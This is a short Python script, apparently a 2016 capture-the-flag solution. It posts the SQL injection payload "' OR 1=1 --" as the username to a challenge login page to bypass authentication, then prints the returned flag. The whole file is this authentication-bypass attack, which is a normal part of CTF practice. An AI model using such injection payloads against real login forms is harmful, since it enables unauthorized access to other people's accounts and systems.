#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: john
# @Date:   2016-03-19 21:02:26
# @Last Modified by:   john
# @Last Modified time: 2016-03-19 21:05:55

import requests

address = 'http://web.lasactf.com:63017/login.php'

response = requests.post(address, data={'username': "' OR 1=1 --",
                                        'password': 'anything',
                                        })


print response.text.split(':')[-1].strip().replace('</p>', '')
